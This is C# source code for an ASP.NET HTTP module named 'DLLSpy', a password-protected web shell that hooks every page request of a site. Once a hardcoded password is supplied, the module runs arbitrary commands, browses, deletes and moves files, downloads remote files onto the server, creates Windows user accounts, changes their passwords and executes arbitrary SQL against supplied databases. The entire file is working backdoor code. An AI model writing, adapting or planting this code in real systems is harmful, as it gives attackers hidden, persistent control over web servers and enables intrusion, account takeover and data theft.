using System;
using System.Collections.Generic;
using System.Text;
using System.Web;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using System.Net;
using System.Management;
using System.Text.RegularExpressions;

namespace MyModel
{
    class ASPNET:IHttpModule
    {
        HttpApplication ha = null;
        public void Dispose(){}
        System.Web.Caching.Cache ccc = new System.Web.Caching.Cache();
        public void Init(HttpApplication context)
        {
            context.EndRequest += new EventHandler(context_EndRequest);
        }

        
        /// <summary>
        /// 入口
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        void context_EndRequest(object sender, EventArgs e)
        {
            ha = (HttpApplication)sender;
            string DLLspy_action = "0";
            if (!UserLogin())
            {
                return;
            }
            else
            {
                ha.Response.Write("We_are_the_world_I_miss_you");
            }

            if (ha.Request["DLLspy_action"] != null && ha.Request["DLLspy_action"] != "")
            {
                DLLspy_action = ha.Request["DLLspy_action"].Trim() ;
                switch (DLLspy_action)
                {
                    case "login":
                        LoginLoad();
                        break;
                    case "cmd":
                        querycmd();
                        break;
                    case "systeminfo":
                        GetSysInfo();
                        break;
                    case "files":
                        SelectFileAction();
                        break;
                    case "SearchFile":
                        SearchFile();
                        break;
                    case "GetSearchData":
                        GetSearchResult();
                        break;
                    case "EndSearchProcess":
                        EndSearchProcess();
                        break;
                    case "compress":
                        FileCompress();
                        break;
                    case "IISspy":
                        GetIISspy();
                        break;
                    case "RemoteDownLoad":
                        RemoteDownLoad();
                        break;
                    case "winUserAPI":
                        winUserAPI();
                        break;
                    case "SQL":
                        ConnSQL();
                        break;
                    case "reg":
                        break;
                    default:
                        break;
                }
            }
            

            
            //ha.Response.Write("<!--这是每个页面都会动态生成的文字。--grayworm-->");
           // ha.Dispose();
        }


        /// <summary>
        /// 第一次登陆
        /// </summary>
        public void LoginLoad()
        {
            string OnceLogin = "";
            OnceLogin = System.Environment.Version + "|" + System.Environment.OSVersion + "|" + System.Net.Dns.Resolve(System.Net.Dns.GetHostName()).AddressList[0].ToString();
            OnceLogin+=@"|<a href='http://www.cnblogs.com/zpino' target='_blank'>DLLSpy Ver: 2010 beta 1.0</a>";
            OnceLogin += "|" + ha.Server.MapPath("~");
            OutStrFunc(OnceLogin);
        
        }

        /// <summary>
        /// 执行CMD
        /// </summary>
        public void querycmd()
        {
            tools tool=new tools();
            string cmd = "";
            string query = "";
            string outstr = "";
            bool isadmin = false;
            string adminuser = "";
            string adminpass = "";
            outstr += @"<div style='margin-left:15px;margin-right:15px;' >";
            if (ha.Request["DLLspy_cmd"] == null || ha.Request["DLLspy_cmd"] == "")
            {
                outstr += "not find File 。 ?DLLspy_cmd=c:\\windows\\system32\\cmd.exe";
                OutStrFunc(outstr);
                return;
            }
            else
            {
                cmd = ha.Request["DLLspy_cmd"];
            }
            try
            {
                adminuser = ha.Request["DLLspy_adminuser"].Trim();
                adminpass = ha.Request["DLLspy_adminpass"].Trim();
                if (adminuser.Length>0)
                {
                    isadmin = true;
                }
            }
            catch (Exception ex)
            {
                outstr += ex.ToString();
            }

            try
            {
                query = ha.Request["DLLspy_q"];
            }
            catch (Exception)
            {
                query = "";
            }
            outstr += ("<p>FilePath:" + cmd + adminuser+adminpass);
            outstr += ("<p>Command:" + query + "<p>");
            Process myProcess = new Process();
            if (isadmin)
            {
                
                System.Security.SecureString ss = new System.Security.SecureString();
                for (int i = 0; i < adminpass.Length; i++)
                {
                    ss.AppendChar(Convert.ToChar(adminpass.Substring(i, 1)));
                }
                myProcess.StartInfo.UserName = adminuser;
                myProcess.StartInfo.Password = ss;
                myProcess.StartInfo.Domain = "WORKGROUP";
            }
            myProcess.StartInfo.UseShellExecute = false;
            myProcess.StartInfo.CreateNoWindow = true;
            myProcess.StartInfo.RedirectStandardInput = true;
            myProcess.StartInfo.RedirectStandardOutput = true;
            myProcess.StartInfo.RedirectStandardError = true;
            myProcess.StartInfo.Arguments = query;
            myProcess.StartInfo.FileName = cmd;
            try
            {
                myProcess.Start();
            }
            catch (Exception ex)
            {
                outstr += ex.ToString();
            }
            StreamWriter sIn = myProcess.StandardInput;//标准输入流 
            sIn.AutoFlush = true;
            StreamReader sOut = myProcess.StandardOutput;//标准输出流 
            StreamReader sErr = myProcess.StandardError;//标准错误流 
            sIn.Write(query + System.Environment.NewLine);
            

            string s = sOut.ReadToEnd();//读取执行DOS命令后输出信息 
            string er = sErr.ReadToEnd();//读取执行DOS命令后错误信息 

            sIn.Write("exit " + System.Environment.NewLine);
            if (myProcess.HasExited == false)
            {
                myProcess.Kill();
            }
            myProcess.Close();
            sIn.Close();
            sOut.Close();
            sErr.Close();


            outstr += ("<p>OutInfo:<br>" +(tool.ReplaceFunc(s)).Replace("\r\n", @"<br>"));
            outstr += "<p>--------------------------------";
            if (er.Length > 0)
            {
                outstr += ("<p>ErrorInfo:<br>" + tool.ReplaceFunc(er));
            }
            else
            {
                outstr += ("<p>execute successfully");
            }
            outstr += ("</div>");
            OutStrFunc(outstr);
            
        }

        /// <summary>
        /// 登录验证
        /// </summary>
        /// <returns></returns>
        public bool UserLogin()
        {
            bool result = false;
            string pass = "";
            if (ha.Request["DLLspy_pass"] == null || ha.Request["DLLspy_pass"] == "")
            {
                return result;
            }
            else
            {
                pass = ha.Request["DLLspy_pass"];
            }
            if (pass == "t00ls")
            {
                result = true;
            }
            return result;
        }

        /// <summary>
        /// 获取系统信息
        /// </summary>
        public void GetSysInfo()
        {
            string BackStr = "";
            string info = "";

            info += "<br> Terminal Port :";
            try
            {
                RegistryKey Terminal = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp");
                string TerminalPort = ReadReg(Terminal, "PortNumber");
                info += TerminalPort;
            }
            catch (Exception errors)
            {
                info += errors.ToString();
            }

            info += "<b><br>IPAdress :";
            try
            {
                foreach (System.Net.IPAddress item in System.Net.Dns.Resolve(System.Net.Dns.GetHostName()).AddressList)
                {
                    info += item.ToString() +" | ";
                }

            }
            catch (Exception errors)
            {
                info += errors.ToString();
            }
            

            info += "<br>Drives :";
            foreach (string item in System.Environment.GetLogicalDrives())
            {
                info += item.ToString();
    
            }

            //info += "<br>Environment Variables:";
            //foreach (System.Collections.IDictionary item in System.Environment.GetEnvironmentVariables()
            //{
            //    info += "<br>key:" + item.Keys.ToString() + "  value" + item.Values.ToString();
            //}

            try
            {
                info += "<br>Host Name:" + System.Net.Dns.GetHostName();
                info += "<br>DNS Name:" + System.Net.Dns.GetHostByName(System.Net.Dns.GetHostName()).HostName;
            }
            catch (Exception errors)
            {
                info += errors.ToString();
            }

            try
            {
                info += "<br>Current User:" + System.Environment.UserName;
                info += "<br>User DomainName:" + System.Environment.UserDomainName;
                info += "<br>Framework  Version:" + System.Environment.Version;
                info += "<br>Run time: " + System.Environment.TickCount / 1000 + " Second";
                info += "<br>OS Version:" + System.Environment.OSVersion;
                info += "<br>Core Count:" + System.Environment.ProcessorCount;
                info += "<br>SystemDirectory:" + System.Environment.SystemDirectory;
                info += "<br> DLL Path :" + Environment.CurrentDirectory;
            }
            catch (Exception errors)
            {
                 info += errors.ToString();
            }

            ManagementClass diskClass = new ManagementClass("Win32_LogicalDisk");
            try
            {
                diskClass.Get();
                info += "<br> Win32_LogicalDisk(for WMI) :" + diskClass.Properties.Count + "G properties";
            }
            catch (Exception errors)
            {
                info += errors.ToString();
            }
            diskClass.Dispose();

            info += "</b>";
            OutStrFunc(info);
        }

        /// <summary>
        /// 读取注册表
        /// </summary>
        /// <param name="RegPath"></param>
        /// <param name="strValueName"></param>
        /// <returns></returns>
        public string ReadReg(RegistryKey RegPath, string strValueName)
        {

            object RegInfo;
            string RegValue = "";
            try
            {
                RegInfo = RegPath.GetValue(strValueName, "NULL");
                if (RegInfo.GetType() == typeof(byte[]))
                {
                    foreach (byte tmpbyte in (byte[])RegInfo)
                    {
                        if ((int)tmpbyte < 16)
                        {
                            RegValue += "0";
                        }
                        RegValue += tmpbyte.ToString("X");
                    }
                }
                else if (RegInfo.GetType() == typeof(string[]))
                {
                    foreach (string tmpstr in (string[])RegInfo)
                    {
                        RegValue += tmpstr;
                    }
                }
                else
                {
                    RegValue = RegInfo.ToString();
                }
            }
            catch (Exception errors)
            {
                RegValue += errors.Message;
            }
            return RegValue;
        }

        /// <summary>
        /// 文件操作
        /// </summary>
        public void FileAction(string dirpath)
        {
            
            string ReStr = "";
            Files f = new Files();
            List<FilesModel> list = new List<FilesModel>();
            list = f.GetAllInfo(dirpath);
            ReStr += "<h2 id='CurrentPath' align='left'>Current Path &gt;&gt;<div id='cp' name='cp'  >" + dirpath + "</div></h2><p>";
            if (list.Count > 0)
            {
                ReStr += @"<table class='alt1'><tr><td>Checked</td><td>Number</td><td>Name</td><td>Size</td><td>CreatTime</td><td>ChangeTime</td><td>Action</td></tr>";
                //ha.Response.Write(j.toJSON(list));
                for (int i = 0; i < list.Count; i++)
                {
                    ReStr += @"<tr>";
                    FilesModel fm = new FilesModel();
                    fm = list[i];
                    ReStr += @"<td> <input type='checkbox' title='" + fm.Type.ToString() + "' id='" + fm.Id.ToString() + "' /></td>";
                    ReStr += @"<td width='8%'>" + fm.Id.ToString() + @"</td>";
                    if (fm.Type == 1)
                    {
                        ReStr += @"<td><a href=# onclick='ClickDir(this);' title=" + StrEnCode(fm.FullPath) + ">" + fm.FileName.ToString() + @"</a></td>";
                    }
                    else
                    {
                        ReStr += @"<td>" + fm.FileName.ToString() + @"</td>";
                    }
                    ReStr += @"<td>" + fm.FileSize.ToString() + @"</td>";
                    ReStr += @"<td width='100px'>" + fm.CreatTime.ToString() + @"</td>";
                    ReStr += @"<td width='100px'>" + fm.LastWrite.ToString() + @"</td>";
                    ReStr += @"<td> ";
                    ReStr += @"<input type='button' name='Del' value='Del' id='Del' class='bt'   onclick=DelFile('" + StrEnCode(fm.FullPath) + "'); />";
                    ReStr += @"<input type='button' name='Move' value='Move' id='Move' class='bt'   onclick=MoveFile('" + StrEnCode(fm.FullPath) + "'); />";
                    if (fm.Type == 2)
                    {
                        ReStr += @"<input type='button' name='Copybt' value='Copy' id='Copybt' class='bt'   onclick=CopyFile('" + StrEnCode(fm.FullPath) + "'); />";
                        ReStr += @"<input type='button' name='Change' value='Change' id='Change' class='bt'   onclick=ChangeFile('" + StrEnCode(fm.FullPath) + "'); />";
                    }
                     
                    ReStr += @"</td>";
                    ReStr += @"</tr>";
                }
                ReStr += @"</table>";
            }
            else
            {
                ReStr +="NO file";
            }
            OutStrFunc(ReStr);

        }


        /// <summary>
        /// 选择文件处理方法
        /// </summary>
        public void SelectFileAction()
        {
            string dirpath="";
            string FileRquestType ="";
            try
            {
                FileRquestType = ha.Request["DLLspy_RquestType"].ToString();
                dirpath = ha.Request["DLLspy_path"].ToString();
            }
            catch (Exception ex)
            {
                OutStrFunc("<p>" + ex.ToString() + "<p>");
            }
            Files f = new Files();
            List<FilesModel> list = new List<FilesModel>();
           //DirectoryInfo di = new DirectoryInfo(dirpath);
            if (FileRquestType=="1")  //显示所有文件
            {
                try
                {
                    FileAction(dirpath);
                }
                catch (Exception ex)
                {
                    OutStrFunc(ex.ToString());
                    return;
                }
            }
            if (FileRquestType=="2") //显示父目录文件
            {
                try
                {
                    DirectoryInfo di = new DirectoryInfo(dirpath);
                    FileAction(di.Parent.FullName);
                }
                catch (Exception ex)
                {
                    OutStrFunc(ex.ToString());
                    return;
                }
            }
            if (FileRquestType=="3")  //删除所选文件和文件夹
            {
                dirpath=StrDeCode(dirpath);
                try
                {
                    if (File.Exists(dirpath))
                    {
                        File.Delete(dirpath);
                    }
                    else
                    {
                        Directory.Delete(dirpath);
                    }
                }
                catch (Exception ex)
                {
                    OutStrFunc(ex.ToString());
                }
                OutStrFunc("OK");
            }
            if (FileRquestType == "4")  //返回web根目录
            {
                try
                {
                    FileAction(ha.Server.MapPath("~"));
                }
                catch (Exception ex)
                {
                    OutStrFunc(ex.ToString());
                    return;
                }
            }
            if (FileRquestType == "5")   //移动文件或者文件夹
            {
                try
                {
                    string[] pathlist = dirpath.Split('$');
                    if (File.Exists(dirpath))
                    {
                        File.Move(StrDeCode(pathlist[0]),StrDeCode( pathlist[1]));
                    }
                    else
                    {
                        Directory.Move(StrDeCode(pathlist[0]), StrDeCode(pathlist[1]));
                    }
                }
                catch (Exception ex)
                {

                    OutStrFunc(  ex.ToString());
                }
                OutStrFunc("OK");
            }
            if (FileRquestType == "6")   //复制文件或者文件夹
            {
                try
                {
                    string[] pathlist = dirpath.Split('$');
                    f.CopyFile(StrDeCode(pathlist[0]),StrDeCode(pathlist[1]));
                }
                catch (Exception ex)
                {

                    OutStrFunc(ex.ToString());
                }
                OutStrFunc("OK");
            }
        }

        /// <summary>
        /// 文件搜索
        /// </summary>
        public void SearchFile()
        {
            string s_path="";
            string s_str="";
            int s_type=0;
            string x = "";
            if (ha.Application["FileSearchThreadState"] != null)
            {
                x = ha.Application["FileSearchThreadState"].ToString();
                if (x == "1")
                {
                    OutStrFunc(ha.Application["FileSearchThreadInfo"].ToString());
                    OutStrFunc("<br>Thaed is run.....yan can [EndProcess]");
                    return;
                }
            }
            else
            {
                ha.Application.Add("FileSearchThreadState", "1");
            }


            try
            {
                s_path = ha.Request["DLLspy_path"].ToString();
                s_str = ha.Request["DLLspy_str"].ToString();
                s_type = Convert.ToInt32(ha.Request["DLLspy_type"].ToString());
            }
            catch (Exception ex)
            {
                OutStrFunc("arguments error!" + ex.ToString());
                return;
            }
            DirectoryInfo di = new DirectoryInfo(s_path);
            if (!di.Exists)
            {
                OutStrFunc("directory not Exists!");
                return;
            }
            SearchFileThread mt = new SearchFileThread(ha.Application);
            try
            {               
                mt.SearchFile(s_path, s_str, s_type);
            }
            catch (Exception ex)
            {
                
            }
            OutStrFunc("Search is run.....please wait!....you can [GetSearchDate] or [EndProcess]");
        }


        /// <summary>
        /// 获取文件搜索结果
        /// </summary>
        public void GetSearchResult()
        {
            string x = "";
            string c = "";
            if (ha.Application["FileSearchThreadState"] != null)
            {
                x = ha.Application["FileSearchThreadState"].ToString();
                if (x == "1")
                {
                    c += ha.Application["FileSearchThreadInfo"].ToString();
                }
                else
                {
                    List<object> list = new List<object>();
                    List<object> list2 = new List<object>();
                    list = (List<object>)ha.Application["FileSearchThread"];
                    c += "<b>FileSearchThreadInfo:" + ha.Application["FileSearchThreadInfo"].ToString();
                    c += "<br>FileSearchThreadState:" + ha.Application["FileSearchThreadState"].ToString();
                    c += "<br>Seach list count:" + list.Count.ToString();
                    c += "</b><br>------------------------------------";
                    for (int i = 0; i < list.Count; i++)
                    {
                        c += "<br>(" +(i+1).ToString() +")"+ list[i].ToString();
                    }
                    c += "<P><B>Search is End</B>";
                   
                }
                c =c+ ("<br>Current Time:" + DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss") )  ;
                OutStrFunc(c);
            }
            else
            {
                OutStrFunc("No Date");
            }
        }

        /// <summary>
        /// 终止文件搜索线程
        /// </summary>
        public void EndSearchProcess()
        {
            if (ha.Application["FileSearchThreadState"] != null)
            {
                ha.Application["FileSearchThreadState"] = "0";
                OutStrFunc("Thrading End");
            }
            else
            {
                OutStrFunc("No SearchThread");
            }
        }


        /// <summary>
        /// 文件压缩和解压
        /// </summary>
        public void FileCompress()
        {
            string sourPath = "";
            string GzipFolder = "";
            string GzipName="";
            string FuncType = "";
            try
            {
                FuncType = ha.Request["DLLspy_FuncType"].ToString();
                sourPath = ha.Request["DLLspy_sourPath"].ToString();
                GzipFolder = ha.Request["DLLspy_GzipFolder"].ToString();
                GzipName = ha.Request["DLLspy_GzipName"].ToString();
            }
            catch (Exception ex)
            {
                OutStrFunc(ex.ToString());
                return;
            }
            if (FuncType == "" || sourPath == "" || GzipFolder == "" || GzipName=="")
            {
                OutStrFunc("arguments error!");
                return;
            }
            if (!Directory.Exists(GzipFolder))
            {
                OutStrFunc("GzipFolder not Exists!");
                return;
            }
            
            if (FuncType=="pack")
            {
                if (!Directory.Exists(sourPath))
                {
                    OutStrFunc("SourcePath not Exists!");
                    return;
                }
                if (File.Exists(GzipFolder + "\\" + GzipName))
                {
                    OutStrFunc("GzipFile is Exists!");
                    return;
                }


                GZip.Compress(sourPath, GzipFolder, GzipName);
            }
            if (FuncType == "Unpack")
            {
                if (!File.Exists(GzipFolder + "\\" + GzipName))
                {
                    OutStrFunc("GzipFile not Exists!");
                    return;
                }
                //OutStrFunc("Unpack!" + GzipFolder + "|" + GzipFolder + "|" + GzipName);
                GZip.Decompress(GzipFolder, GzipFolder, GzipName);
            }
            OutStrFunc("successfully!");
            //GZip.Decompress("",)
        }


        /// <summary>
        /// iisspy
        /// </summary>
        public void GetIISspy()
        {
            IISSpy iis = new IISSpy();
            OutStrFunc(iis.GetSite());
            
        }


        /// <summary>
        /// 远程下载
        /// </summary>
        public void RemoteDownLoad()
        {
            string RemoteURL = "";
            string LocalPath = "";
            try
            {
                RemoteURL = ha.Request["DLLspy_RemoteURL"].ToString();
                LocalPath = ha.Request["DLLspy_LocalPath"].ToString();
            }
            catch (Exception ex)
            {
                OutStrFunc(ex.ToString());
            }

             WebClient myclient = new WebClient();
             myclient.DownloadFile(RemoteURL, LocalPath);
             myclient.Dispose();
             OutStrFunc("download OK!");
        }


        /// <summary>
        /// 操作windows用户的一些API
        /// </summary>
        public void winUserAPI()
        {
            string actionAPI = "";
            string username = "";
            string password = "";
            string groupname = "";
            string msg = "";
            try
            {
                actionAPI = ha.Request["DLLspy_actionAPI"].ToString();
                username = ha.Request["DLLspy_username"].ToString();
            }
            catch (Exception ex)
            {
                OutStrFunc(ex.ToString());
                return;
            }
            WinUserControl winAPI = new WinUserControl();
            switch (actionAPI)
            {
                case "AddUser":
                    try
                    {
                        password = ha.Request["DLLspy_password"].ToString();
                        groupname = ha.Request["DLLspy_UserGroup"].ToString();
                    }
                    catch (Exception ex)
                    {
                        msg += ex.ToString();
                    }
                    if (winAPI.ExistWinUser(username))
                    {
                        msg += "User is Exists!";
                    }
                    else
                    {
                        msg += winAPI.CreateLocalUser(username, password, groupname);
                    }
                    break;


                case "DelUser" :
                    if (!winAPI.ExistWinUser(username))
                    {
                        msg += "User not Exists!";
                    }
                    else
                    {
                        msg += winAPI.DeleteWinUser(username).ToString();
                    }
                    break;


                case "ChangePassword":
                    string oldpass="";
                    try
                    {
                        password = ha.Request["DLLspy_password"].ToString();
                        oldpass = ha.Request["DLLspy_oldpass"].ToString();
                    }
                    catch (Exception ex)
                    {
                        msg += ex.ToString();
                    }
                    if (!winAPI.ExistWinUser(username))
                    {
                        msg += "User not Exists!";
                    }
                    else
                    {
                        msg += winAPI.ChangeWinUserPasswd(username, password, oldpass);
                    }
                    break;
                case "AllUsers":
                    msg += winAPI.GetAllUser();
                    break;
                case "GetUserInfo":
                    msg += winAPI.GetUser(username);
                    break;
                default:
                    break;
                         
            }
            OutStrFunc(msg);
        
        }

        /// <summary>
        /// 连接数据库
        /// </summary>
        public void ConnSQL()
        {
            string SqlType = "";
            string SqlText = "";
            try
            {
                SqlType = ha.Request["DLLspy_SqlType"].ToString();
                SqlText = ha.Request["DLLspy_SqlText"].ToString();
            }
            catch (Exception ex)
            {
                OutStrFunc(ex.ToString());
                return;
            }
            if (SqlType == "sqlserver")
            {
                SqlServerControls(SqlText);
            }
            if (SqlType == "access")
            {
                AccessControls(SqlText);
            }
        }

        /// <summary>
        /// 操作SqlServer数据
        /// </summary>
        public void SqlServerControls(string sqltext)
        {
            string ConnStr = "";
            
            try
            {
                ConnStr = ha.Request["DLLspy_ConnStr"].ToString();
            }
            catch (Exception ex)
            {
                OutStrFunc(ex.ToString());
                return;
            }
            SqlHelper.SetConnStr(ConnStr);
            OutStrFunc(SqlHelper.ExecuteSqlStr(sqltext));
        }


        /// <summary>
        /// 操作ACCESS数据库
        /// </summary>
        /// <param name="sqltext"></param>
        public void AccessControls(string sqltext)
        {
            string ConnStr = "";

            try
            {
                ConnStr = ha.Request["DLLspy_ConnStr"].ToString();
            }
            catch (Exception ex)
            {
                OutStrFunc(ex.ToString());
                return;
            }
            SqlHelper.SetConnStr(ConnStr);
            if (sqltext == "Get All ACCESS TABLES")
            {
                OutStrFunc(SqlHelper.AccessConnGetAllTables());
                return;
            }
            OutStrFunc(SqlHelper.AccessConn(sqltext));
        }

        /// <summary>
        /// 输出函数
        /// </summary>
        /// <param name="str"></param>
        public void OutStrFunc(string outstr)
        {
            ha.Response.Write(outstr);
        }


        /// <summary>
        /// ASCII编码
        /// </summary>
        /// <param name="?"></param>
        /// <returns></returns>
        public string StrEnCode(string instr)
        {
            //byte[] tmp = Encoding.Default.GetBytes(instr);
            //return Convert.ToBase64String(tmp);
            string charstr = "";
            char[] charlist = instr.ToCharArray();
            for (int i = 0; i < charlist.Length; i++)
            {
                charstr += (Convert.ToInt32(charlist[i])).ToString();
                if (i != charlist.Length - 1)
                {
                    charstr += "|";
                }
            }
            return charstr;
        }

        /// <summary>
        /// ASCII解码
        /// </summary>
        /// <param name="str"></param>
        /// <returns></returns>
        public string StrDeCode(string str)
        {
            StringBuilder sb = new StringBuilder();
            string[] asciistr = str.Split('|');
            foreach (var item in asciistr)
            {
                sb.Append(Convert.ToChar(Convert.ToInt32(item)));
            }
            return sb.ToString();
        }

   


    }
    
    
}
